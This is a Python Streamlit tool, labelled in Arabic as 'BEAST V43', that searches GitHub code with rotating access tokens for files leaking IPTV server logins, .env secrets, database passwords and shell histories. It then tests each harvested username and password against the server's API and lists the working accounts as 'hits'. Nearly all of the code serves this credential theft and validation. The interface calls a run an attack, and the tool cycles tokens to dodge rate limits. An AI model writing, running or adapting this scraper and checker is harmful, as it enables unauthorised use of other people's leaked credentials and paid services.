import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# --- إعدادات الواجهة الفائقة ---
st.set_page_config(page_title="BEAST V43 - HYPER-DRIVE", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False
if "hits" not in st.session_state: st.session_state.hits = []

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V43 - HYPER-DRIVE</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الواجهة (Dark Professional)
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: 'Courier New', monospace; font-size: 12px; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
        box-shadow: 0 0 10px rgba(0, 255, 65, 0.1);
    }
    .text-green { color: #00ff41; font-weight: bold; font-size: 16px; }
    .text-yellow { color: #fbbf24; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي
with st.sidebar:
    st.title("⚡ BEAST V43")
    tokens_raw = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx...\nghp_yyy...")
    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    threads = st.slider("قوة المحرك ⚡ (عدد الخيوط):", 10, 100, 40)
    page_depth = st.number_input("عمق البحث (صفحات لكل دروك):", 1, 100, 30)
    
    start = st.button("🚀 إطلاق الهجوم الشامل")
    if st.button("🗑️ مسح النتائج"):
        st.session_state.hits = []
        st.rerun()

# مساحات العرض
st.subheader("📡 الرادار المباشر")
radar_area = st.empty()

st.subheader(f"🏆 النتائج الشغالة: {len(st.session_state.hits)}")
hits_area = st.container()

# --- محرك البحث والفحص ---
def check_server(host, user, pw):
    """وظيفة لفحص السيرفر بشكل مستقل"""
    try:
        check_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(check_url, timeout=4).json()
        if r.get("user_info", {}).get("status") == "Active":
            return {
                "host": host, "user": user, "pw": pw,
                "exp": r['user_info'].get('exp_date'),
                "conn": r['user_info'].get('max_connections')
            }
    except: return None
    return None

def process_file_content(raw_url):
    """سحب المحتوى واستخراج الروابط"""
    try:
        content = requests.get(raw_url, timeout=3).text
        # ريجيكس قوي جداً يسحب كل أنواع الروابط (ببورت أو بدون)
        pattern = r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
        return re.findall(pattern, content)
    except: return []

if start and tokens:
    found_count = 0
    token_cycle = 0
    
    # قائمة دروكات ضخمة معدلة للنتائج العربية والعالمية
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        'extension:env "XTREAM_USER" "XTREAM_PASSWORD"',
        'extension:json "server_url" "username"',
        'extension:log "http://" "username=" "password="',
        'filename:config.php "db_user" "db_pass" "http"',
        '"beIN" "get.php?username="',
        '"SSC" "player_api.php"',
        '"OSN" "password=" "http"',
        'extension:m3u8 "username=" "password="',
        'extension:txt "http://" "port" "username" "password"',
        'filename:.bash_history "get.php?username="'
    ]

    for dork in dorks:
        for page in range(1, page_depth + 1):
            # تبديل التوكن تلقائياً لتفادي الحظر
            current_token = tokens[token_cycle % len(tokens)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(search_url, headers=headers)
                
                if res.status_code != 200:
                    token_cycle += 1 # انتقل للتوكن التالي بصمت
                    continue

                items = res.json().get('items', [])
                if not items: break

                radar_area.info(f"🔎 فحص: {dork[:30]}.. | صفحة: {page} | توكن: {token_cycle % len(tokens) + 1}")

                # تحويل النتائج لروابط خام
                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in items]

                # فحص متوازي للمحتوى والسيرفرات
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    # المرحلة 1: جلب الروابط من الملفات
                    content_futures = [executor.submit(process_file_content, url) for url in raw_urls]
                    
                    for fut in as_completed(content_futures):
                        matches = fut.result()
                        if not matches: continue
                        
                        # المرحلة 2: فحص السيرفرات المستخرجة فوراً
                        for host, user, pw in matches:
                            radar_area.markdown(f"<p class='scan-log'>🔄 Testing: {host}</p>", unsafe_allow_html=True)
                            
                            # تشغيل فحص السيرفر في خيط منفصل لعدم تعطيل السحب
                            hit = check_server(host, user, pw)
                            if hit:
                                if hit not in st.session_state.hits:
                                    st.session_state.hits.append(hit)
                                    found_count += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{len(st.session_state.hits)}</span><br>
                                            <span style="color:#fff;">HOST: {hit['host']}</span><br>
                                            <span class="text-yellow">USER: {hit['user']} | PASS: {hit['pw']}</span><br>
                                            <small style="color:#888;">Exp: {hit['exp']} | Connections: {hit['conn']}</small>
                                        </div>
                                        """, unsafe_allow_html=True)

            except Exception as e:
                token_cycle += 1
                continue

    st.success(f"🏁 اكتمل الهجوم! تم العثور على {len(st.session_state.hits)} سيرفر شغّال.")
